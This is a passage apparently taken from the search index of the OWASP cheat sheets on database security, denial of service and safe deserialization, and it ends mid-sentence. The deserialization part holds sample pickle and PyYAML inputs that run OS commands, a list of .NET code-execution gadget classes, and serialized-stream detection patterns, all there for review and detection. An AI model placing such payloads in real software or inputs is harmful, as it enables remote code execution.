Disable the SQL Browser service. Disable Mixed Mode Authentication unless it is required. Ensure that the sample Northwind and AdventureWorks databases have been removed. See Microsoft's articles on securing SQL Server . MySQL and MariaDB \u00b6 Run the mysql_secure_installation script to remove the default databases and accounts. Disable the FILE privilege for all users to prevent them reading or writing files. See the Oracle MySQL and MariaDB hardening guides. PostgreSQL \u00b6 See the PostgreSQL Server Setup and Operation documentation and the older Security documentation . MongoDB \u00b6 See the MongoDB security checklist . Redis \u00b6 See the Redis security guide .","title":"Database Security"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#database-security-cheat-sheet","text":"","title":"Database Security Cheat Sheet"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#introduction","text":"This cheat sheet provides guidance on securely configuring and using the SQL and NoSQL databases. It is intended to be used by application developers when they are responsible for managing the databases, in the absence of a dedicated database administrator (DBA). For details about protecting against SQL Injection attacks, see the SQL Injection Prevention Cheat Sheet .","title":"Introduction"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#connecting-to-the-database","text":"The backend database used by the application should be isolated as much as possible, in order to prevent malicious or undesirable users from being able to connect to it. Exactly how this is achieved will depend on the system and network architecture. The following options could be used to protect it: Disabling network (TCP) access and requiring all access is over a local socket file or named pipe. Configuring the database to only bind on localhost. Restricting access to the network port to specific hosts with firewall rules. Placing the database server in a separate DMZ isolated from the application server. Similar protection should be implemented to protect any web-based management tools used with the database, such as phpMyAdmin. When an application is running on an untrusted system (such as a thick-client), it should always connect to the backend through an API that can enforce appropriate access control and restrictions. Direct connections should never be made from a thick client to the backend database.","title":"Connecting to the Database"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#transport-layer-protection","text":"Most databases will allow unencrypted network connections in their default configurations. Although some will encrypt the initial authentication (such as Microsoft SQL Server), the rest of the traffic will be unencrypted, meaning that all kinds of sensitive information will be sent across the network in clear text. The following steps should be taken to prevent unencrypted traffic: Configure the database to only allow encrypted connections. Install a trusted digital certificate on the server. Configure the client application to connect using TLSv1.2+ with modern ciphers (e.g, AES-GCM or ChaCha20). Configure the client application to verify that the digital certificate is correct. The Transport Layer Protection and TLS Cipher String Cheat Sheets contain further guidance on securely configuring TLS.","title":"Transport Layer Protection"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#authentication","text":"The database should be configured to always require authentication, including connections from the local server. Database accounts should be: Protected with strong and unique passwords. Used by a single application or service. Configured with the minimum permissions required as discussed in the permissions section below . As with any system that has its own user accounts, the usual account management processes should be followed, including: Regular reviews of the accounts to ensure that they are still required. Regular reviews of permissions. Removing user accounts when an application is decommissioned. Changing the passwords when staff leave, or there is reason to believe that they may have been compromised. For Microsoft SQL Server, consider the use of Windows or Integrated-Authentication , which uses existing Windows accounts rather than SQL Server accounts. This also removes the requirement to store credentials in the application, as it will connect using the credentials of the Windows user it is running under. The Windows Native Authentication Plugins provides similar functionality for MySQL.","title":"Authentication"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#storing-database-credentials","text":"Database credentials should never be stored in the application source code, especially if they are unencrypted. Instead, they should be stored in a configuration file that: Is outside of the webroot. Has appropriate permissions so that it can only be read by the required user(s). Is not checked into source code repositories. Where possible, these credentials should also be encrypted or otherwise protected using built-in functionality, such as the web.config encryption available in ASP.NET .","title":"Storing Database Credentials"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#permissions","text":"The permissions assigned to database user accounts should be based on the principle of least privilege (i.e, the accounts should only have the minimal permissions required for the application to function). This can be applied at a number of increasingly granular levels levels depending on the functionality available in the database. The following steps should be applicable to all environments: Do not use the built-in root , sa or SYS accounts. Do not grant the account administrative rights over the database instance. Only allow the account to connect from whitelisted hosts. This would often be localhost or the address of the application server. Only grant the account access to the specific databases it needs. Development, UAT and Production environments should all use separate databases and accounts. Only grant the required permissions on the databases. Most applications would only need SELECT , UPDATE and DELETE permissions. The account should not be the owner of the database as this can lead to privilege escalation vulnerabilities. Avoid using database links or linked servers. Where they are required, use an account that has been granted access to only the minimum databases, tables, and system privileges required. For more security-critical applications, it is possible to apply permissions at more granular levels, including: Table-level permissions. Column-level permissions. Row-level permissions Blocking access to the underlying tables, and requiring all access through restricted views .","title":"Permissions"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#database-configuration-and-hardening","text":"The underlying operating system for the database server should be hardened in the same way as any other server, based on a secure baseline such as the CIS Benchmarks or the Microsoft Security Baselines . The database application should also be properly configured and hardened. The following principles should apply to any database application and platform: Install any required security updates and patches. Configure the database services to run under a low privileged user account. Remove any default accounts and databases. Store transaction logs on a separate disk to the main database files. Configure a regular backup of the database. Ensure that the backups are protected with appropriate permissions, and ideally encrypted. The following sections gives some further recommendations for specific database software, in addition to the more general recommendations given above.","title":"Database Configuration and Hardening"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#microsoft-sql-server","text":"Disable xp_cmdshell , xp_dirtree and other stored procedures that are not required. Disable Common Language Runtime (CLR) execution. Disable the SQL Browser service. Disable Mixed Mode Authentication unless it is required. Ensure that the sample Northwind and AdventureWorks databases have been removed. See Microsoft's articles on securing SQL Server .","title":"Microsoft SQL Server"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#mysql-and-mariadb","text":"Run the mysql_secure_installation script to remove the default databases and accounts. Disable the FILE privilege for all users to prevent them reading or writing files. See the Oracle MySQL and MariaDB hardening guides.","title":"MySQL and MariaDB"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#postgresql","text":"See the PostgreSQL Server Setup and Operation documentation and the older Security documentation .","title":"PostgreSQL"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#mongodb","text":"See the MongoDB security checklist .","title":"MongoDB"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html#redis","text":"See the Redis security guide .","title":"Redis"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html","text":"Denial of Service Cheat Sheet \u00b6 Introduction \u00b6 This sheet is focused on providing an overall, common overview with an informative, straight to the point guidance to propose angles on how to battle denial of service (DoS) attacks on different layers. It is by no means complete, however, it should serve as an indicator to inform the reader and to introduce a workable methodology to tackle this issue. Fundamentals \u00b6 Considering that anti-DoS approaches are not one-step solutions, it becomes apparent that, for it to be implemented, it's necessary to involve different profiles within your organization to assess the actual situation and to apply countermeasures accordingly. These profiles are: developers and architects in the area of application and infrastructure. Key concepts within information security evolve around criteria or properties such as the CIA triad . The letter A , which stands for availability, is our focal point. The core essence of a DoS is to affect, by any means, the availability of instances or objects and to eventually render it inaccessible. Thus, for any information system to serve its purpose, it must be available at any time. Hence why every computing system within the interoperability flow must function correctly to achieve that. To remain resilient and resistant, it's imperative - and suggested - to outline and to conduct a thorough analysis on components within your inventory based on functionality, architecture and performance (i.e. application-wise, infrastructure and network related). The outcome of this research should identify potential causes of a DoS which highlight single point of failures ranging from programming related errors to resource exhaustion.. From a prevention point of view, it's important to have a clear picture on how to tackle your appropriate components to address the issue at stake (e.g. bottlenecks, etc.). That's why a solid understanding of your environment is essential to develop a suitable defence mechanism. These could be aligned with: scaling options ( up = inner hardware components, out = the number of complete components) existing conceptual / logical techniques (such as applying redundancy measurements, bulk-heading, etc. - which expands your in-house capabilities) a cost analysis applied to your situation Within this document we will adhere to a particular guidance structure to illustrate on how to analyse this subject based on your situation. It is by no means a complete approach but we ought to create fundamental blocks which should be utilized to assist you in constructing anti-DoS concepts fitting to your needs. General Categories and Basic Controls \u00b6 In this cheat sheet, we will adhere to the DDOS classification as documented by CERT-EU. The document categorizes the 7 OSI model layers into three main attack categories, namely application, Session and Network. TODO: Add Diagram Application attacks focus on rendering applications unavailable by exhausting resources or by making it unusable in a functional way. Session (or protocol) attacks focus on consuming server resources, or resources of intermediary equipment like firewalls and load-balancers. Network (or volumetric) attacks focus on saturating the bandwidth of the network resource. It is important to understand that each of these three attack categories needs to be considered when designing a DoS resilient solution. Note that OSI model layer 1 and 2 are not included in this categorization. In the spirit of providing a complete overview of all DoS type of attacks, we will shortly discuss these layers and how DoS applies to them. The physical layer consists of the networking hardware transmission technologies of a network. It is a fundamental layer underlying the logical data structures of the higher-level functions in a network. Typical DoS scenarios are destruction, obstruction, malfunction. An example is a case where a Georgian elderly woman sliced through an underground cable, resulting in loss of internet for the whole of Armenia. The data layer is the protocol layer that transfers data between adjacent network nodes in a wide area network (WAN) or between nodes on the same local area network (LAN) segment. Typical DoS scenarios are MAC flooding (targeting switch MAC tables) and ARP poisoning. In MAC flooding attacks, a switch is flooded with packets, each with a different source MAC address. The intention is to consume the limited memory used by a switch to store the MAC and physical port translation table (MAC table). The result is that valid MAC addresses are purged and the switch enters a fail-over mode where it will act as a network hub. All data is then forwarded to all ports, resulting in a data leakage. TODO impact in relation to DoS TODO document compact remediation In ARP poisoning attacks a malicious actor sends spoofed ARP (Address Resolution Protocol) messages over the wire. The result is that the attacker's MAC address can be linked to the IP address of a legitimate device on the network. This allows an attacker to intercept, modify or stop data in transit, that was intended for the victim IP address. The ARP protocol is specific to the local area network and could cause a DoS on the wire communication. Packet filtering technology can be used to inspect packets in transit to identify and block offending ARP packets. Another approach is to use static ARP tables but they prove difficult to be maintained. Application attacks \u00b6 Application layer attacks focus on rendering applications unavailable by exhausting resources or by making it unusable in a functional way. These attacks do not have to consume the network bandwidth to be effective. Rather they place an operational strain on the application server in such a way that the server becomes unavailable, unusable or non-functional. All attacks exploiting weaknesses on OSI layer 7 protocol stack are generally categorised as application attacks. They are most challenging to identify/mitigate. TODO: List all attacks per category. Because we cannot map remediations one on one with an attack vector, we will first need to list them before discussing the action points Slow HTTP is a DoS attack type where HTTP requests are send very slow and fragmented, one at a time. Until the HTTP request was fully delivered, the server will keep resources stalled while waiting for the missing incoming data. At one moment, the server will reach the maximum concurrent connection pool, resulting in a DoS. From an attacker's perspective, slow HTTP attacks are cheap to perform because they require minimal resources. Software Design Concepts \u00b6 Cheap validation first : Validation that is cheap in resources should be considered first. More (CPU, memory and bandwidth) expensive validation should be performed afterward. The reason is obvious, we want to reduce impact on these resources as soon as possible. Graceful Degradation is the ability of maintaining functionality when portions of a system or application break. DoS caused by application termination is a widespread problem. Implementing a fault tolerant design enables a system or application to continue its intended operation, possibly at a reduced level, rather than failing completely, when some part of the system fails. Graceful degradation is a core concept to follow during application design phase, in order to limit impact of DoS. Prevent single point of failure Avoid highly CPU consuming operations Keep Queues short Handle Exceptions Protect overflow and underflow Threading : Avoid operations which must wait for completion of large tasks to proceed. Asynchronous operations Identify resource intensive pages and plan ahead. Session \u00b6 Limit server side session time based on inactivity and a final timeout : (resource exhaustion) While sessions timeout is most of the time discussed in relation to session security and preventing session hijacking, it is also an important measure to prevent resource exhaustion. Limit session bound information storage: the less data is linked to a session, the less burden a user session has on webserver's performance. Input validation \u00b6 Limit file upload size and extensions (resource exhaustion) to prevent DoS on file space storage or other web application functions which will use the upload as input (e.g. image resizing, PDF creation, etc.) - Checklist . Limit total request size (resource exhaustion) to make it harder for resource consuming DoS attack to succeed. Prevent input based resource allocation (resource exhaustion). Prevent input based function and threading interaction (resource exhaustion). User input could influence how many times a function needs to be executed, or how intensive the CPU consumption becomes. Depending on (unfiltered) user input for resource allocation could allow a DoS scenario through resource exhaustion. Input based puzzles like captchas or simple math problems are often used to 'protect' a web form. They serve a purpose to protect against functionality abuse. The classic example is a webform that will send out an email after posting the request. A captcha could then prevent the mailbox from getting flooded by a malicious attacker or spambot. Notice that this kind of technology will not help defend against DoS attacks. Access control \u00b6 Authentication as a means to expose functionality User lockout is a scenario where an attacker can take advantage of the application security mechanisms to cause DoS by abusing the login failure. Network attacks \u00b6 TODO: (Develop text) Attacks where network bandwidth gets saturation. Volumetric in nature. Amplification techniques make these attacks effective. TODO: (list attacks) NTP amplification, DNS amplification, UDP flooding, TCP flooding Network Design Concepts \u00b6 Preventing single point of failure Pooling Caching is the concept that data is stored so future requests for that data can be served faster. The more data is served via caching, to more resilient the application becomes to bandwidth exhaustion. Static resources hosting on a different domain will reduce the number of http requests on the web application. Images and JavaScript are typical files that are loaded from a different domain. Rate limiting \u00b6 Rate limiting is the process of controlling traffic rate from and to a server or component. It can be implemented on infrastructure as well as on an application level. Rate limiting can be based on (offending) IPs, on IP blacklists, on geolocation, etc. Define a minimum ingress data rate limit , and drop all connections below that rate. Note that if the rate limit is set too low, this could impact clients. Inspect the logs to establish a baseline of genuine traffic rate. (Protection against slow HTTP attacks) Define an absolute connection timeout Define a maximum ingress data rate limit , and drop all connections above that rate. Define a total bandwidth size limit to prevent bandwidth exhaustion Define a load limit , which specifies the number of users allowed to access any given resource at any given time. ISP-Level remediations \u00b6 Filter invalid sender addresses using edge routers , in accordance with RFC 2267, to filter out IP-spoofing attacks done with the goal of bypassing block lists. Check your ISP services in terms of DDOS beforehand (support for multiple internet access points, enough bandwidth (xx-xxx Gbit/s) and special hardware for traffic analysis and defence on application level Global-Level remediations: Commercial cloud filter services \u00b6 Consider using a filter service in order to resist larger attacks (up to 500GBit/s) Filter services support different mechanics to filter out malicious or non compliant traffic Comply with relevant data protection/privacy laws - a lot of providers route traffic through USA/UK Related Articles \u00b6 CERT-EU Whitepaper","title":"Denial of Service"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#denial-of-service-cheat-sheet","text":"","title":"Denial of Service Cheat Sheet"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#introduction","text":"This sheet is focused on providing an overall, common overview with an informative, straight to the point guidance to propose angles on how to battle denial of service (DoS) attacks on different layers. It is by no means complete, however, it should serve as an indicator to inform the reader and to introduce a workable methodology to tackle this issue.","title":"Introduction"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#fundamentals","text":"Considering that anti-DoS approaches are not one-step solutions, it becomes apparent that, for it to be implemented, it's necessary to involve different profiles within your organization to assess the actual situation and to apply countermeasures accordingly. These profiles are: developers and architects in the area of application and infrastructure. Key concepts within information security evolve around criteria or properties such as the CIA triad . The letter A , which stands for availability, is our focal point. The core essence of a DoS is to affect, by any means, the availability of instances or objects and to eventually render it inaccessible. Thus, for any information system to serve its purpose, it must be available at any time. Hence why every computing system within the interoperability flow must function correctly to achieve that. To remain resilient and resistant, it's imperative - and suggested - to outline and to conduct a thorough analysis on components within your inventory based on functionality, architecture and performance (i.e. application-wise, infrastructure and network related). The outcome of this research should identify potential causes of a DoS which highlight single point of failures ranging from programming related errors to resource exhaustion.. From a prevention point of view, it's important to have a clear picture on how to tackle your appropriate components to address the issue at stake (e.g. bottlenecks, etc.). That's why a solid understanding of your environment is essential to develop a suitable defence mechanism. These could be aligned with: scaling options ( up = inner hardware components, out = the number of complete components) existing conceptual / logical techniques (such as applying redundancy measurements, bulk-heading, etc. - which expands your in-house capabilities) a cost analysis applied to your situation Within this document we will adhere to a particular guidance structure to illustrate on how to analyse this subject based on your situation. It is by no means a complete approach but we ought to create fundamental blocks which should be utilized to assist you in constructing anti-DoS concepts fitting to your needs.","title":"Fundamentals"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#general-categories-and-basic-controls","text":"In this cheat sheet, we will adhere to the DDOS classification as documented by CERT-EU. The document categorizes the 7 OSI model layers into three main attack categories, namely application, Session and Network. TODO: Add Diagram Application attacks focus on rendering applications unavailable by exhausting resources or by making it unusable in a functional way. Session (or protocol) attacks focus on consuming server resources, or resources of intermediary equipment like firewalls and load-balancers. Network (or volumetric) attacks focus on saturating the bandwidth of the network resource. It is important to understand that each of these three attack categories needs to be considered when designing a DoS resilient solution. Note that OSI model layer 1 and 2 are not included in this categorization. In the spirit of providing a complete overview of all DoS type of attacks, we will shortly discuss these layers and how DoS applies to them. The physical layer consists of the networking hardware transmission technologies of a network. It is a fundamental layer underlying the logical data structures of the higher-level functions in a network. Typical DoS scenarios are destruction, obstruction, malfunction. An example is a case where a Georgian elderly woman sliced through an underground cable, resulting in loss of internet for the whole of Armenia. The data layer is the protocol layer that transfers data between adjacent network nodes in a wide area network (WAN) or between nodes on the same local area network (LAN) segment. Typical DoS scenarios are MAC flooding (targeting switch MAC tables) and ARP poisoning. In MAC flooding attacks, a switch is flooded with packets, each with a different source MAC address. The intention is to consume the limited memory used by a switch to store the MAC and physical port translation table (MAC table). The result is that valid MAC addresses are purged and the switch enters a fail-over mode where it will act as a network hub. All data is then forwarded to all ports, resulting in a data leakage. TODO impact in relation to DoS TODO document compact remediation In ARP poisoning attacks a malicious actor sends spoofed ARP (Address Resolution Protocol) messages over the wire. The result is that the attacker's MAC address can be linked to the IP address of a legitimate device on the network. This allows an attacker to intercept, modify or stop data in transit, that was intended for the victim IP address. The ARP protocol is specific to the local area network and could cause a DoS on the wire communication. Packet filtering technology can be used to inspect packets in transit to identify and block offending ARP packets. Another approach is to use static ARP tables but they prove difficult to be maintained.","title":"General Categories and Basic Controls"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#application-attacks","text":"Application layer attacks focus on rendering applications unavailable by exhausting resources or by making it unusable in a functional way. These attacks do not have to consume the network bandwidth to be effective. Rather they place an operational strain on the application server in such a way that the server becomes unavailable, unusable or non-functional. All attacks exploiting weaknesses on OSI layer 7 protocol stack are generally categorised as application attacks. They are most challenging to identify/mitigate. TODO: List all attacks per category. Because we cannot map remediations one on one with an attack vector, we will first need to list them before discussing the action points Slow HTTP is a DoS attack type where HTTP requests are send very slow and fragmented, one at a time. Until the HTTP request was fully delivered, the server will keep resources stalled while waiting for the missing incoming data. At one moment, the server will reach the maximum concurrent connection pool, resulting in a DoS. From an attacker's perspective, slow HTTP attacks are cheap to perform because they require minimal resources.","title":"Application attacks"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#software-design-concepts","text":"Cheap validation first : Validation that is cheap in resources should be considered first. More (CPU, memory and bandwidth) expensive validation should be performed afterward. The reason is obvious, we want to reduce impact on these resources as soon as possible. Graceful Degradation is the ability of maintaining functionality when portions of a system or application break. DoS caused by application termination is a widespread problem. Implementing a fault tolerant design enables a system or application to continue its intended operation, possibly at a reduced level, rather than failing completely, when some part of the system fails. Graceful degradation is a core concept to follow during application design phase, in order to limit impact of DoS. Prevent single point of failure Avoid highly CPU consuming operations Keep Queues short Handle Exceptions Protect overflow and underflow Threading : Avoid operations which must wait for completion of large tasks to proceed. Asynchronous operations Identify resource intensive pages and plan ahead.","title":"Software Design Concepts"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#session","text":"Limit server side session time based on inactivity and a final timeout : (resource exhaustion) While sessions timeout is most of the time discussed in relation to session security and preventing session hijacking, it is also an important measure to prevent resource exhaustion. Limit session bound information storage: the less data is linked to a session, the less burden a user session has on webserver's performance.","title":"Session"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#input-validation","text":"Limit file upload size and extensions (resource exhaustion) to prevent DoS on file space storage or other web application functions which will use the upload as input (e.g. image resizing, PDF creation, etc.) - Checklist . Limit total request size (resource exhaustion) to make it harder for resource consuming DoS attack to succeed. Prevent input based resource allocation (resource exhaustion). Prevent input based function and threading interaction (resource exhaustion). User input could influence how many times a function needs to be executed, or how intensive the CPU consumption becomes. Depending on (unfiltered) user input for resource allocation could allow a DoS scenario through resource exhaustion. Input based puzzles like captchas or simple math problems are often used to 'protect' a web form. They serve a purpose to protect against functionality abuse. The classic example is a webform that will send out an email after posting the request. A captcha could then prevent the mailbox from getting flooded by a malicious attacker or spambot. Notice that this kind of technology will not help defend against DoS attacks.","title":"Input validation"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#access-control","text":"Authentication as a means to expose functionality User lockout is a scenario where an attacker can take advantage of the application security mechanisms to cause DoS by abusing the login failure.","title":"Access control"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#network-attacks","text":"TODO: (Develop text) Attacks where network bandwidth gets saturation. Volumetric in nature. Amplification techniques make these attacks effective. TODO: (list attacks) NTP amplification, DNS amplification, UDP flooding, TCP flooding","title":"Network attacks"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#network-design-concepts","text":"Preventing single point of failure Pooling Caching is the concept that data is stored so future requests for that data can be served faster. The more data is served via caching, to more resilient the application becomes to bandwidth exhaustion. Static resources hosting on a different domain will reduce the number of http requests on the web application. Images and JavaScript are typical files that are loaded from a different domain.","title":"Network Design Concepts"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#rate-limiting","text":"Rate limiting is the process of controlling traffic rate from and to a server or component. It can be implemented on infrastructure as well as on an application level. Rate limiting can be based on (offending) IPs, on IP blacklists, on geolocation, etc. Define a minimum ingress data rate limit , and drop all connections below that rate. Note that if the rate limit is set too low, this could impact clients. Inspect the logs to establish a baseline of genuine traffic rate. (Protection against slow HTTP attacks) Define an absolute connection timeout Define a maximum ingress data rate limit , and drop all connections above that rate. Define a total bandwidth size limit to prevent bandwidth exhaustion Define a load limit , which specifies the number of users allowed to access any given resource at any given time.","title":"Rate limiting"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#isp-level-remediations","text":"Filter invalid sender addresses using edge routers , in accordance with RFC 2267, to filter out IP-spoofing attacks done with the goal of bypassing block lists. Check your ISP services in terms of DDOS beforehand (support for multiple internet access points, enough bandwidth (xx-xxx Gbit/s) and special hardware for traffic analysis and defence on application level","title":"ISP-Level remediations"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#global-level-remediations-commercial-cloud-filter-services","text":"Consider using a filter service in order to resist larger attacks (up to 500GBit/s) Filter services support different mechanics to filter out malicious or non compliant traffic Comply with relevant data protection/privacy laws - a lot of providers route traffic through USA/UK","title":"Global-Level remediations: Commercial cloud filter services"},{"location":"cheatsheets/Denial_of_Service_Cheat_Sheet.html#related-articles","text":"CERT-EU Whitepaper","title":"Related Articles"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html","text":"Deserialization Cheat Sheet \u00b6 Introduction \u00b6 This article is focused on providing clear, actionable guidance for safely deserializing untrusted data in your applications. What is Deserialization \u00b6 Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML. However, many programming languages offer a native capability for serializing objects. These native formats usually offer more features than JSON or XML, including customizability of the serialization process. Unfortunately, the features of these native deserialization mechanisms can be repurposed for malicious effect when operating on untrusted data. Attacks against deserializers have been found to allow denial-of-service, access control, and remote code execution (RCE) attacks. Guidance on Deserializing Objects Safely \u00b6 The following language-specific guidance attempts to enumerate safe methodologies for deserializing data that can't be trusted. PHP \u00b6 WhiteBox Review \u00b6 Check the use of unserialize() function and review how the external parameters are accepted. Use a safe, standard data interchange format such as JSON (via json_decode() and json_encode() ) if you need to pass serialized data to the user. Python \u00b6 BlackBox Review \u00b6 If the traffic data contains the symbol dot . at the end, it's very likely that the data was sent in serialization. WhiteBox Review \u00b6 The following API in Python will be vulnerable to serialization attack. Search code for the pattern below. The uses of pickle/c_pickle/_pickle with load/loads : import pickle data = \"\"\" cos.system(S'dir')tR. \"\"\" pickle . loads ( data ) Uses of PyYAML with load : import yaml document = \"!!python/object/apply:os.system ['ipconfig']\" print ( yaml . load ( document )) Uses of jsonpickle with encode or store methods. Java \u00b6 The following techniques are all good for preventing attacks against deserialization against Java's Serializable format . Implementation advices: In your code, override the ObjectInputStream#resolveClass() method to prevent arbitrary classes from being deserialized. This safe behavior can be wrapped in a library like SerialKiller . Use a safe replacement for the generic readObject() method as seen here. Note that this addresses \" billion laughs \" type attacks by checking input length and number of objects deserialized. WhiteBox Review \u00b6 Be aware of the following Java API uses for potential serialization vulnerability. 1. XMLdecoder with external user defined parameters 2. XStream with fromXML method (xstream version <= v1.46 is vulnerable to the serialization issue) 3. ObjectInputStream with readObject 4. Uses of readObject , readObjectNodData , readResolve or readExternal 5. ObjectInputStream.readUnshared 6. Serializable BlackBox Review \u00b6 If the captured traffic data include the following patterns may suggest that the data was sent in Java serialization streams AC ED 00 05 in Hex rO0 in Base64 Content-type header of an HTTP response set to application/x-java-serialized-object Prevent Data Leakage and Trusted Field Clobbering \u00b6 If there are data members of an object that should never be controlled by end users during deserialization or exposed to users during serialization, they should be declared as the transient keyword (section Protecting Sensitive Information ). For a class that defined as Serializable, the sensitive information variable should be declared as private transient . For example, the class myAccount, the variable 'profit' and 'margin' were declared as transient to avoid to be serialized: public class myAccount implements Serializable { private transient double profit ; // declared transient private transient double margin ; // declared transient .... Prevent Deserialization of Domain Objects \u00b6 Some of your application objects may be forced to implement Serializable due to their hierarchy. To guarantee that your application objects can't be deserialized, a readObject() method should be declared (with a final modifier) which always throws an exception: private final void readObject ( ObjectInputStream in ) throws java . io . IOException { throw new java . io . IOException ( \"Cannot be deserialized\" ); } Harden Your Own java.io.ObjectInputStream \u00b6 The java.io.ObjectInputStream class is used to deserialize objects. It's possible to harden its behavior by subclassing it. This is the best solution if: You can change the code that does the deserialization You know what classes you expect to deserialize The general idea is to override ObjectInputStream.html#resolveClass() in order to restrict which classes are allowed to be deserialized. Because this call happens before a readObject() is called, you can be sure that no deserialization activity will occur unless the type is one that you wish to allow. A simple example of this shown here, where the the LookAheadObjectInputStream class is guaranteed not to deserialize any other type besides the Bicycle class: public class LookAheadObjectInputStream extends ObjectInputStream { public LookAheadObjectInputStream ( InputStream inputStream ) throws IOException { super ( inputStream ); } /** * Only deserialize instances of our expected Bicycle class */ @Override protected Class <?> resolveClass ( ObjectStreamClass desc ) throws IOException , ClassNotFoundException { if ( ! desc . getName (). equals ( Bicycle . class . getName ())) { throw new InvalidClassException ( \"Unauthorized deserialization attempt\" , desc . getName ()); } return super . resolveClass ( desc ); } } More complete implementations of this approach have been proposed by various community members: NibbleSec - a library that allows whitelisting and blacklisting of classes that are allowed to be deserialized IBM - the seminal protection, written years before the most devastating exploitation scenarios were envisioned. Apache Commons IO classes Harden All java.io.ObjectInputStream Usage with an Agent \u00b6 As mentioned above, the java.io.ObjectInputStream class is used to deserialize objects. It's possible to harden its behavior by subclassing it. However, if you don't own the code or can't wait for a patch, using an agent to weave in hardening to java.io.ObjectInputStream is the best solution. Globally changing ObjectInputStream is only safe for blacklisting known malicious types, because it's not possible to know for all applications what the expected classes to be deserialized are. Fortunately, there are very few classes needed in the blacklist to be safe from all the known attack vectors, today. It's inevitable that more \"gadget\" classes will be discovered that can be abused. However, there is an incredible amount of vulnerable software exposed today, in need of a fix. In some cases, \"fixing\" the vulnerability may involve re-architecting messaging systems and breaking backwards compatibility as developers move towards not accepting serialized objects. To enable these agents, simply add a new JVM parameter: -javaagent:name-of-agent.jar Agents taking this approach have been released by various community members: rO0 by Contrast Security A similar, but less scalable approach would be to manually patch and bootstrap your JVM's ObjectInputStream. Guidance on this approach is available here . .Net CSharp \u00b6 WhiteBox Review \u00b6 Search the source code for the following terms: TypeNameHandling JavaScriptTypeResolver Look for any serializers where the type is set by a user controlled variable. BlackBox Review \u00b6 Search for the following base64 encoded content that starts with: AAEAAAD///// Search for content with the following text: TypeObject $type: General Precautions \u00b6 Don't allow the datastream to define the type of object that the stream will be deserialized to. You can prevent this by for example using the DataContractSerializer or XmlSerializer if at all possible. Where JSON.Net is being used make sure the TypeNameHandling is only set to None . TypeNameHandling = TypeNameHandling . None If JavaScriptSerializer is to be used then do not use it with a JavaScriptTypeResolver . If you must deserialise data streams that define their own type, then restrict the types that are allowed to be deserialized. One should be aware that this is still risky as many native .Net types potentially dangerous in themselves. e.g. System . IO . FileInfo FileInfo objects that reference files actually on the server can when deserialized, change the properties of those files e.g. to read-only, creating a potential denial of service attack. Even if you have limited the types that can be deserialised remember that some types have properties that are risky. System.ComponentModel.DataAnnotations.ValidationException , for example has a property Value of type Object . if this type is the type allowed for deserialization then an attacker can set the Value property to any object type they choose. Attackers should be prevented from steering the type that will be instantiated. If this is possible then even DataContractSerializer or XmlSerializer can be subverted e.g. // Action below is dangerous if the attacker can change the data in the database var typename = GetTransactionTypeFromDatabase (); var serializer = new DataContractJsonSerializer ( Type . GetType ( typename )); var obj = serializer . ReadObject ( ms ); Execution can occur within certain .Net types during deserialization. Creating a control such as the one shown below is ineffective. var suspectObject = myBinaryFormatter . Deserialize ( untrustedData ); //Check below is too late! Execution may have already occurred. if ( suspectObject is SomeDangerousObjectType ) { //generate warnings and dispose of suspectObject } For BinaryFormatter and JSON.Net it is possible to create a safer form of white list control using a custom SerializationBinder . Try to keep up-to-date on known .Net insecure deserialization gadgets and pay special attention where such types can be created by your deserialization processes. A deserializer can only instantiate types that it knows about . Try to keep any code that might create potential gadgets separate from any code that has internet connectivity. As an example System.Windows.Data.ObjectDataProvider used in WPF applications is a known gadget that allows arbitrary method invocation. It would be risky to have this a reference to this assembly in a REST service project that deserializes untrusted data. Known .NET RCE Gadgets \u00b6 System.Configuration.Install.AssemblyInstaller System.Activities.Presentation.WorkflowDesigner System.Windows.ResourceDictionary System.Windows.Data.ObjectDataProvider System.Windows.Forms.BindingSource Microsoft.Exchange.Management.SystemManager.WinForms.ExchangeSettingsProvider System.Data.DataViewManager, System.Xml.XmlDocument/XmlDataDocument System.Management.Automation.PSObject Language-Agnostic Methods for Deserializing Safely \u00b6 Using Alternative Data Formats \u00b6 A great reduction of risk is achieved by avoiding native (de)serialization formats. By switching to a pure data format like JSON or XML, you lessen the chance of custom deserialization logic being repurposed towards malicious ends. Many applications rely on a data-transfer object pattern that involves creating a separate domain of objects for the explicit purpose data transfer. Of course, it's still possible that the application will make security mistakes after a pure data object is parsed. Only Deserialize Signed Data \u00b6 If the application knows before deserialization which messages will need to be processed, they could sign them as part of the serialization process. The application could then to choose not to deserialize any message which didn't have an authenticated signature. Mitigation Tools/Libraries \u00b6 Java secure deserialization library SWAT (Serial Whitelist Application Trainer) NotSoSerial Detection Tools \u00b6 Java deserialization cheat sheet aimed at pen testers A proof-of-concept tool for generating payloads that exploit 